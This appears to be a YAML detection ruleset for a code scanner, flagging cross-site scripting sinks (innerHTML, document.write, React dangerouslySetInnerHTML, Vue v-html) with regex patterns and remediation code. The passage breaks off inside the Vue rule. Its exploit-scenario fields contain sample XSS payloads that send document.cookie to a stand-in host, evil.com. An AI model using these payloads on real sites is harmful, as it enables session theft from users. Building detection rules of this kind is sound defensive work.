# ============================================================================
# XSS Detection Rules - JavaScript / TypeScript
# Ruleset Version: 3.0.0
# Last Updated: 2025-01-15
# Category: Cross-Site Scripting (CWE-79)
# Language: JavaScript / TypeScript (React, Vue, Angular, vanilla DOM)
# ============================================================================

rules:

  # --------------------------------------------------------------------------
  # XSS-JS-001: innerHTML Assignment with User Input
  # --------------------------------------------------------------------------
  - rule_id: XSS-JS-001
    title: innerHTML Assignment with User-Controlled Data
    description: >
      Detects assignment of user-controlled data to Element.innerHTML or
      Element.outerHTML properties. innerHTML parses and executes any embedded
      script tags, event handlers, and javascript: URIs. This is the most common
      DOM-based XSS vector in vanilla JavaScript applications and remains
      prevalent in legacy codebases and jQuery-to-vanilla migrations.
    language: javascript
    category: xss
    severity: High
    confidence: 0.93
    cwe: CWE-79
    owasp: A03:2021-Injection
    tags: [xss, dom-xss, innerHTML, client-side, javascript]
    detection_layer: 1
    attack_surface_type: web
    patterns:
      - type: regex
        pattern: '\.innerHTML\s*=\s*[^;]{0,100}(?:request|req|query|param|input|search|hash|location|document\.URL|document\.referrer|window\.name)\b'
        description: "innerHTML assigned from request or location source"
      - type: regex
        pattern: '\.innerHTML\s*=\s*[^;]{0,80}(?:getElementById|querySelector|getElementsBy)\s*\([^)]*\)\.(?:value|textContent|innerText|innerHTML)\b'
        description: "innerHTML assigned from another DOM element value"
      - type: regex
        pattern: '\.innerHTML\s*(?:\+|=)\s*[`''"]\s*<.*?\$\{.*?\}.*?>'
        description: "innerHTML with template literal containing interpolation in HTML tags"
      - type: regex
        pattern: '\.innerHTML\s*=\s*.*?(?:\.searchParams|\.hash|\.search|\.pathname|URLSearchParams)'
        description: "innerHTML assigned from URL parameters"
      - type: regex
        pattern: '\.outerHTML\s*=\s*(?:.*(?:req|param|input|query|user|data|body|args))'
        description: "outerHTML assigned from user-controlled variable"
      - type: regex
        pattern: '\.innerHTML\s*=\s*(?:response|res|data|result|json|payload|body|content)[\.\[]'
        description: "innerHTML assigned from API response data"
      - type: regex
        pattern: '\.innerHTML\s*\+=\s*(?![''\"]<(?:br|hr|p)\s*/?>[''\"])'
        description: "innerHTML concatenation append (not simple safe tags)"
    anti_patterns:
      - 'DOMPurify'
      - 'sanitize'
      - 'sanitizeHtml'
      - 'xss-filters'
      - 'escape'
      - 'encodeHTML'
      - 'textContent'
      - 'createTextNode'
      - 'innerText'
      - '.test.'
      - '__tests__'
      - 'spec.'
      - 'mock'
      - 'fixture'
      - 'jest'
    bypass_variants:
      - description: "innerHTML via bracket notation"
        pattern: 'element\s*\[\s*[''"]innerHTML[''"]s*\]\s*=\s*'
      - description: "insertAdjacentHTML as innerHTML alternative"
        pattern: '\.insertAdjacentHTML\s*\(\s*[''"](?:beforeend|afterbegin|beforebegin|afterend)[''"].*?(?:param|input|query|user|data)'
      - description: "DOM Range.createContextualFragment"
        pattern: '\.createContextualFragment\s*\(\s*(?:.*(?:user|input|data|query|param))'
    evasion_indicators:
      - "innerHTML assigned via bracket property access"
      - "insertAdjacentHTML used as innerHTML alternative"
      - "DOM Range used to parse untrusted HTML"
      - "Template literals with HTML and interpolation"
    encoding_variants:
      - type: "direct_assignment"
        pattern: '\.innerHTML\s*=\s*[^;]+(?:param|input|query)'
      - type: "concatenation"
        pattern: '\.innerHTML\s*\+=\s*[^;]+(?:param|input|query)'
      - type: "template_literal"
        pattern: '\.innerHTML\s*=\s*`[^`]*\$\{[^}]*\}[^`]*`'
    multi_function_chain_patterns:
      - "fetch() -> response.json() -> element.innerHTML = data.html"
      - "location.hash -> decodeURIComponent -> element.innerHTML = decoded"
      - "URLSearchParams.get() -> innerHTML = param"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "DOM XSS via innerHTML enables session theft and account takeover"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "location.hash"
        sink: "element.innerHTML"
        through: "string_concatenation"
      - source: "URLSearchParams"
        sink: "element.innerHTML"
        through: "template_literal"
      - source: "fetch_response"
        sink: "element.innerHTML"
        through: "json_data_field"
    impact: |
      innerHTML with user input enables DOM-based XSS:
      - Session cookie theft via document.cookie exfiltration
      - Keylogging and credential theft
      - Defacement and phishing overlay injection
      - Cryptocurrency mining in victim's browser
    remediation: |
      ```javascript
      // SECURE: Use textContent for text-only insertion
      element.textContent = userInput;

      // SECURE: Use DOMPurify for HTML content
      import DOMPurify from 'dompurify';
      element.innerHTML = DOMPurify.sanitize(untrustedHTML);

      // SECURE: Use DOM APIs to build elements
      const el = document.createElement('div');
      el.textContent = userInput;
      container.appendChild(el);
      ```
    references:
      - "https://cwe.mitre.org/data/definitions/79.html"
      - "https://owasp.org/www-community/attacks/DOM_Based_XSS"
      - "https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations"
    context_awareness:
      surrounding_context_patterns: ['innerHTML', 'outerHTML', 'document.getElementById', 'querySelector']
      taint_source_indicators: ['location.hash', 'location.search', 'URLSearchParams', 'document.referrer']
      taint_sink_indicators: ['innerHTML', 'outerHTML', 'insertAdjacentHTML']
      sanitization_patterns: ['DOMPurify.sanitize', 'textContent', 'createTextNode', 'encodeHTML']
    severity_scoring:
      severity_weight: 9
      risk_score_formula_hint: "severity_weight * confidence * (1 + user_input_proximity)"
      exploitability_score: High
    exploit_scenario:
      attack_example: |
        DOM XSS via innerHTML from URL hash:
        https://target.com/page#<img src=x onerror=document.location='https://evil.com/steal?c='+document.cookie>
        element.innerHTML = location.hash.slice(1);
      example_payload: "<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>"
      attacker_objective: "Execute arbitrary JavaScript via DOM-based XSS"
    confidence_factors:
      pattern_strength: high
      context_match: high
      proximity_to_user_input: high
      sanitization_absence: high
    metadata:
      rule_version: '3.0.0'
      last_reviewed: '2025-01-15'
      rule_maturity_level: hardened
      detection_complexity: contextual
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [XSS-JS-002, XSS-JS-003]

  # --------------------------------------------------------------------------
  # XSS-JS-002: document.write with User Input
  # --------------------------------------------------------------------------
  - rule_id: XSS-JS-002
    title: document.write with User-Controlled Data
    description: >
      Detects usage of document.write() and document.writeln() with user-controlled
      data. These methods insert raw HTML into the document stream. When called
      after the document has loaded, document.write replaces the entire page.
      They are a classic XSS sink that is trivially exploitable with any unescaped
      user input containing HTML or script tags.
    language: javascript
    category: xss
    severity: High
    confidence: 0.94
    cwe: CWE-79
    owasp: A03:2021-Injection
    tags: [xss, dom-xss, document-write, legacy, javascript]
    detection_layer: 1
    attack_surface_type: web
    patterns:
      - type: regex
        pattern: 'document\.write\s*\(\s*(?:.*(?:location|document\.URL|document\.referrer|window\.name|document\.cookie))'
        description: "document.write with location or document source"
      - type: regex
        pattern: 'document\.write\s*\(\s*(?:.*(?:param|input|query|search|hash|user|data|content))'
        description: "document.write with user-controlled variable"
      - type: regex
        pattern: 'document\.writeln\s*\(\s*(?:.*(?:param|input|query|user|data|content|request))'
        description: "document.writeln with user-controlled data"
      - type: regex
        pattern: 'document\.write\s*\(\s*[`''"]<.*?\$\{.*?\}.*?>'
        description: "document.write with template literal and HTML interpolation"
      - type: regex
        pattern: 'document\.write\s*\(\s*[''"]<\w+[^>]*[''"].*?\+.*?(?:param|input|data|query|user)'
        description: "document.write concatenating HTML with user input"
      - type: regex
        pattern: 'document\.write\s*\(\s*(?:unescape|decodeURIComponent|atob)\s*\('
        description: "document.write with decoded / unescaped data"
    anti_patterns:
      - 'DOMPurify'
      - 'sanitize'
      - 'escape'
      - 'encodeHTML'
      - 'textContent'
      - '.test.'
      - '__tests__'
      - 'spec.'
      - 'mock'
      - 'fixture'
      - 'jest'
      - 'document.write.*<script.*src'
      - 'google.*analytics'
      - 'gtag'
    bypass_variants:
      - description: "document.write via variable reference"
        pattern: '(?:const|let|var)\s+\w+\s*=\s*document\.write\s*;\s*\w+\s*\('
      - description: "eval constructing document.write call"
        pattern: 'eval\s*\(\s*[''"]document\.write'
      - description: "document.write in setTimeout/setInterval"
        pattern: '(?:setTimeout|setInterval)\s*\(\s*[''"]document\.write'
    evasion_indicators:
      - "document.write called via function alias"
      - "document.write invoked through eval"
      - "document.write in timer callback string"
      - "document.write with decoded input"
    encoding_variants:
      - type: "direct_call"
        pattern: 'document\.write\s*\(\s*[^)]*(?:param|user|data)'
      - type: "concatenation"
        pattern: 'document\.write\s*\(\s*[''"][^'']*[''"].*?\+.*?\)'
      - type: "template_literal"
        pattern: 'document\.write\s*\(\s*`[^`]*\$\{[^}]*\}'
    multi_function_chain_patterns:
      - "location.search -> decodeURIComponent -> document.write(decoded)"
      - "XMLHttpRequest -> responseText -> document.write(response)"
      - "window.name -> document.write(name)"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "document.write XSS enables full page takeover"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "location.search"
        sink: "document.write"
        through: "string_concatenation"
      - source: "window.name"
        sink: "document.write"
        through: "direct_pass"
      - source: "document.referrer"
        sink: "document.write"
        through: "template_literal"
    impact: |
      document.write with user input enables immediate XSS:
      - Full page content replacement after loading
      - Script injection and execution
      - Session hijacking and credential theft
      - Drive-by download attacks
    remediation: |
      ```javascript
      // AVOID: document.write is discouraged entirely
      // SECURE: Use DOM APIs instead
      const el = document.createElement('div');
      el.textContent = userInput;
      document.body.appendChild(el);

      // For dynamic content, use sanitization
      import DOMPurify from 'dompurify';
      element.innerHTML = DOMPurify.sanitize(untrustedContent);
      ```
    references:
      - "https://cwe.mitre.org/data/definitions/79.html"
      - "https://developer.mozilla.org/en-US/docs/Web/API/Document/write"
    context_awareness:
      surrounding_context_patterns: ['document.write', 'document.writeln', 'document.open']
      taint_source_indicators: ['location', 'document.URL', 'document.referrer', 'window.name']
      taint_sink_indicators: ['document.write', 'document.writeln']
      sanitization_patterns: ['DOMPurify', 'encodeHTML', 'textContent', 'createElement']
    severity_scoring:
      severity_weight: 9
      risk_score_formula_hint: "severity_weight * confidence * (1 + sink_severity)"
      exploitability_score: High
    exploit_scenario:
      attack_example: |
        document.write with URL parameter:
        URL: https://target.com/page?name=<script>fetch('https://evil.com?c='+document.cookie)</script>
        Code: document.write('Hello ' + new URLSearchParams(location.search).get('name'));
      example_payload: "<script>document.location='https://evil.com/steal?c='+document.cookie</script>"
      attacker_objective: "Inject script via document.write for DOM XSS"
    confidence_factors:
      pattern_strength: high
      context_match: high
      proximity_to_user_input: high
      sanitization_absence: high
    metadata:
      rule_version: '3.0.0'
      last_reviewed: '2025-01-15'
      rule_maturity_level: hardened
      detection_complexity: contextual
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [XSS-JS-001, XSS-JS-005]

  # --------------------------------------------------------------------------
  # XSS-JS-003: React dangerouslySetInnerHTML
  # --------------------------------------------------------------------------
  - rule_id: XSS-JS-003
    title: React dangerouslySetInnerHTML with Unsanitized Input
    description: >
      Detects usage of React's dangerouslySetInnerHTML prop with user-controlled
      or unsanitized data. React intentionally named this prop to signal danger.
      When used with unsanitized input, it bypasses React's built-in XSS protection
      and allows injection of arbitrary HTML and JavaScript into the virtual DOM.
    language: javascript
    category: xss
    severity: High
    confidence: 0.92
    cwe: CWE-79
    owasp: A03:2021-Injection
    tags: [xss, react, dangerouslySetInnerHTML, jsx, javascript]
    detection_layer: 1
    attack_surface_type: web
    patterns:
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*(?:props|state|data|user|content|body|result|response|param|input)[\.\[]'
        description: "dangerouslySetInnerHTML with user-controlled data source"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*(?!DOMPurify|sanitize|purify|clean)\w+'
        description: "dangerouslySetInnerHTML with unsanitized variable"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*`[^`]*\$\{'
        description: "dangerouslySetInnerHTML with template literal interpolation"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*[''"].*?\+\s*(?:props|state|data)'
        description: "dangerouslySetInnerHTML with string concatenation of props/state"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\w+\s*\}'
        description: "dangerouslySetInnerHTML with variable object (may contain __html)"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*createMarkup\s*\(\s*(?!.*sanitize)(?:props|state|data|user|content)'
        description: "dangerouslySetInnerHTML with createMarkup helper passing user data"
    anti_patterns:
      - 'DOMPurify'
      - 'sanitize'
      - 'sanitizeHtml'
      - 'purify'
      - 'xss'
      - 'isomorphic-dompurify'
      - '.test.'
      - '__tests__'
      - 'spec.'
      - '.stories.'
      - 'mock'
      - 'fixture'
      - 'jest'
      - 'storybook'
    bypass_variants:
      - description: "createMarkup wrapper without sanitization"
        pattern: 'function\s+createMarkup\s*\(\s*\w+\s*\)\s*\{\s*return\s*\{\s*__html\s*:\s*\w+\s*\}'
      - description: "dangerouslySetInnerHTML from API response without sanitization"
        pattern: 'fetch\s*\([^)]+\)[^}]*\.then[^}]*dangerouslySetInnerHTML'
      - description: "Server-rendered HTML passed as prop and set via dangerouslySetInnerHTML"
        pattern: '(?:getServerSideProps|getStaticProps)[^}]*html[^}]*dangerouslySetInnerHTML'
    evasion_indicators:
      - "createMarkup helper hiding dangerouslySetInnerHTML usage"
      - "API response directly passed to dangerouslySetInnerHTML"
      - "Server-rendered HTML inserted without client-side sanitization"
      - "Markdown renderer output passed to dangerouslySetInnerHTML"
    encoding_variants:
      - type: "direct_prop"
        pattern: 'dangerouslySetInnerHTML=\{\{__html:\s*\w+\}\}'
      - type: "helper_function"
        pattern: 'dangerouslySetInnerHTML=\{createMarkup\('
      - type: "spread_props"
        pattern: '\.\.\.\w+.*dangerouslySetInnerHTML'
    multi_function_chain_patterns:
      - "fetch() -> json() -> setState({html: data.content}) -> dangerouslySetInnerHTML={html}"
      - "props.content -> createMarkup(content) -> dangerouslySetInnerHTML"
      - "markdown.render(userInput) -> dangerouslySetInnerHTML"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "React XSS via dangerouslySetInnerHTML bypasses virtual DOM protection"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "props.content"
        sink: "dangerouslySetInnerHTML.__html"
        through: "direct_assignment"
      - source: "api_response"
        sink: "dangerouslySetInnerHTML"
        through: "state_update"
      - source: "user_generated_html"
        sink: "dangerouslySetInnerHTML"
        through: "markdown_render"
    impact: |
      dangerouslySetInnerHTML with unsanitized data enables XSS in React apps:
      - Bypasses React's built-in XSS protection
      - Stored XSS when user-generated HTML rendered from database
      - DOM manipulation and session hijacking
      - Phishing overlays in single-page applications
    remediation: |
      ```jsx
      import DOMPurify from 'dompurify';

      // SECURE: Sanitize before using dangerouslySetInnerHTML
      function SafeHTML({ html }) {
        return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
      }

      // BETTER: Avoid dangerouslySetInnerHTML entirely
      // Use a safe markdown renderer or React components for dynamic content
      ```
    references:
      - "https://cwe.mitre.org/data/definitions/79.html"
      - "https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html"
    context_awareness:
      surrounding_context_patterns: ['React', 'jsx', 'tsx', 'dangerouslySetInnerHTML', 'component']
      taint_source_indicators: ['props.', 'state.', 'data.', 'response.', 'useQuery']
      taint_sink_indicators: ['dangerouslySetInnerHTML', '__html']
      sanitization_patterns: ['DOMPurify.sanitize', 'sanitizeHtml', 'isomorphic-dompurify']
    severity_scoring:
      severity_weight: 9
      risk_score_formula_hint: "severity_weight * confidence * (1 + react_app_exposure)"
      exploitability_score: High
    exploit_scenario:
      attack_example: |
        React component rendering user bio from API:
        <div dangerouslySetInnerHTML={{ __html: user.bio }} />
        Attacker sets bio to: <img src=x onerror="fetch('/api/admin',{headers:{'Cookie':document.cookie}})">
      example_payload: "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>"
      attacker_objective: "Exploit stored XSS via dangerouslySetInnerHTML in React"
    confidence_factors:
      pattern_strength: high
      context_match: high
      proximity_to_user_input: high
      sanitization_absence: high
    metadata:
      rule_version: '3.0.0'
      last_reviewed: '2025-01-15'
      rule_maturity_level: hardened
      detection_complexity: contextual
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [XSS-JS-001, XSS-JS-004]

  # --------------------------------------------------------------------------
  # XSS-JS-004: Vue v-html Directive with Unsanitized Input
  # --------------------------------------------------------------------------
  - rule_id: XSS-JS-004
    title: Vue v-html Directive with Unsanitized Input
    description: >
      Detects usage of Vue.js's v-html directive with user-controlled or unsanitized
      data. The v-html directive renders raw HTML and does not apply any sanitization.
      Vue's documentation explicitly warns that v-html should never be used on
      user-provided content as it can easily lead to XSS vulnerabilities.
    language: javascript
    category: xss
    severity: High
    confidence: 0.91
    cwe: CWE-79
    owasp: A03:2021-Injection
    tags: [xss, vue, v-html, template, javascript]
    detection_layer: 1
    attack_surface_type: web
    patterns:
      - type: regex
        pattern: 'v-html\s*=\s*"(?:user|content|data|body|html|message|comment|post|bio|description|input|param)\w*"'
        description: "v-html bound to user-controlled data property"
      - type: regex
        pattern: 'v-html\s*=\s*"(?:item|record|row|entry|result)\.\w*(?:html|content|body|text|description)"'
        description: "v-html bound to object property with content-like name"
      - type: regex
        pattern: 'v-html\s*=\s*"(?:\$route\.query|\$route\.params|\$route\.hash)'
        description: "v-html bound to Vue router query/params"
      - type: regex
        pattern: '\$el\.innerHTML\s*=|this\.\$refs\.\w+\.innerHTML\s*='
        description: "Vue component setting innerHTML via $el or $refs"
      - type: regex
        pattern: 'v-html\s*=\s*"(?:.*(?:fetch|axios|api|http|response|res))'
        description: "v-html bound to API response data"
      - type: regex
        pattern: 'h\s*\(\s*[''"]div[''"].*?innerHTML\s*:\s*(?:props|data|this\.)'
        description: "Vue render function with innerHTML property"
    anti_patterns:
      - 'DOMPurify'
      - 'sanitize'
      - 'vue-sanitize'
      - 'vue-dompurify'
      - 'xss-filters'
      - 'escape'
      - '.test.'
      - '__tests__'
      - 'spec.'
      - 'mock'
      - 'fixture'
      - 'jest'
      - 'vitest'
      - 'stories.'
    bypass_variants:
      - description: "Computed property wrapping unsanitized HTML"
        pattern: 'computed\s*:\s*\{[^}]*\w+HTML\s*\(\s*\)\s*\{[^}]*return\s+(?:this\.)?(?:content|data|user)(?![^}]*sanitize)'
      - description: "Vue filter processing HTML without sanitization"
        pattern: 'filters\s*:\s*\{[^}]*\w+\s*\(\s*\w+\s*\)\s*\{[^}]*return\s+(?!.*sanitize).*\}'
      - description: "Vuex store state rendered via v-html"
        pattern: 'mapState|mapGetters.*v-html\s*=\s*"\w+\.html'
    evasion_indicators:
      - "Computed property returning unsanitized HTML"
      - "Vue filter processing HTML without sanitization"
      - "Vuex store state rendered directly with v-html"
      - "Vue $refs used to set innerHTML bypassing template"
    encoding_variants:
      - type: "template_directive"
        pattern: 'v-html\s*=\s*"[^"]*(?:content|data|html)"'
      - type: "render_function"
        pattern: 'innerHTML\s*:\s*(?:this\.)?(?:data|content)'
      - type: "jsx_vue"
        pattern: 'domPropsInnerHTML\s*=\s*\{'
    multi_function_chain_patterns:
      - "axios.get() -> store.commit(html) -> v-html='storeHtml'"
      - "$route.query.content -> computed property -> v-html"
      - "user.bio from API -> v-html='user.bio'"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Vue v-html XSS bypasses Vue template encoding"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "api_response"
        sink: "v-html_directive"
        through: "data_property"
      - source: "route_query"
        sink: "v-html"
        through: "computed_property"
      - source: "user_generated_content"
        sink: "v-html"
        through: "vuex_state"
    impact: |
      v-html with unsanitized input enables XSS in Vue applications:
      - Stored XSS from database-sourced HTML content
      - Reflected XSS via Vue router query parameters
      - Component-level XSS affecting all instances
      - SPA session hijacking
    remediation: |
      ```vue
      <template>
        <!-- INSECURE: Never use v-html with user data -->
        <!-- <div v-html="userContent"></div> -->

        <!-- SECURE: Use v-text or template interpolation for text -->
        <div v-text="userContent"></div>

        <!-- SECURE: Sanitize if HTML rendering is required -->
        <div v-html="sanitizedContent"></div>
      </template>
      <script>
      import DOMPurify from 'dompurify';
      export default {
        computed: {
          sanitizedContent() {
            return DOMPurify.sanitize(this.userContent);
          }
        }
      }
